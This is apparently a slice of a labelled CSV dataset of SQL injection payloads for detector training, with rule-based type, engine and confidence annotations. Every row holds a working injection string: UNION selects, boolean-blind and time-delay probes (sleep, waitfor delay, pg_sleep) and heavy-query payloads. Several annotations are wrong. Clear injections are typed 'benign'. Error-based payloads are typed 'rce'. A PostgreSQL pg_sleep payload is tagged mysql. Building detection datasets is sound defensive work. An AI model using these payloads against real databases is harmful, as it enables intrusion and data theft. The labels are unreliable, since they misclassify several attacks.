row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2220,"-1998' ) as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2221,"1%' ) ) union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2222,"-9596 ) where 3425 = 3425 union all select 3425,3425,3425,3425,3425,3425#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2223,"end and ( ""nuix"" like ""nuix",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
2224,1' and ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
2225,1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2226,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'jueq' = 'jueq",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
2227,1' and sleep ( 5 ) and 'usgv' like 'usgv,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2228,"1%"" ) ) and 2006 = 2006",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2229,"1"" ) ) as ktue where 6392 = 6392 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2230,waitfor delay '0:0:5' and ( ( ( '%' = ',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2231,"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --",1,,boolean_blind,generic,0.95,8606 = 8606 or detected — boolean_blind injection (priority 8) on generic,rule-based
2232,"1"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
2233,"1 ) ) as huxq where 7451 = 7451 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2234,"-9531' ) ) ) union all select 4076,4076#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2235,"-8924 ) ) as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,7901 = 7901 or detected — boolean_blind injection (priority 8) on generic,rule-based
2236,"1"" ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2237,"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""uqor"" like ""uqor",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2238,select ( case when ( 9667 = 6212 ) then 9667 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2239,"-5379' ) union all select 4294,4294,4294--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2240,"1 ) where 6990 = 6990 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
2241,1 ) as kaew where 2658 = 2658,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2242,-6588' where 7793 = 7793 or ( 8459 = 8459 ) *4906--,1,,boolean_blind,generic,0.95,7793 = 7793 or detected — boolean_blind injection (priority 8) on generic,rule-based
2243,"1' in boolean mode ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2244,1'|| ( select 'miew' where 8360 = 8360 waitfor delay '0:0:5' ) ||',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2245,"-5672%"" or 3825 = 9675--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2246,1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2247,select sleep ( 5 ) and ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2248,select ( case when ( 3537 = 5218 ) then 3537 else 3537* ( select 3537 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2249,1 and 5934 = 7745,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
